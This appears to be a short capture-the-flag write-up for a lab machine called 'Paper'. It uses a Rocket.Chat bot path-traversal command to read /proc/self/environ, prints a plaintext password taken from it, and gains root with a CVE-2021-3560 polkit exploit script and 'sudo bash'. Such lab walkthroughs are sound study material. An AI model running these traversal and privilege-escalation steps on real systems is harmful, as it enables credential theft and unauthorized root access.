# Paper - Rocketchat / CVE-2021-3560

## Found domain from server response

[image]

## Reaching Wordpress and see the secret blog

https://www.exploit-db.com/exploits/47690

[image]

[image]

## chat.office.paper

### Accessing Rocketchat /proc/self/environ

```bash
recyclops file ../../../proc/self/environ
```

**ROCKETCHAT_PASSWORD=**`Queenofblad3s!23S`

[image]

## SSH and CVE-2021-3560

https://www.exploit-db.com/exploits/50011

```bash
./exp.sh
```

[image]

This group allows members to run `sudo`

```bash
id
uid=1005(tester) gid=1005(tester) groups=1005(tester),10(wheel)
```

[image]

```bash
sudo bash
```

[image]
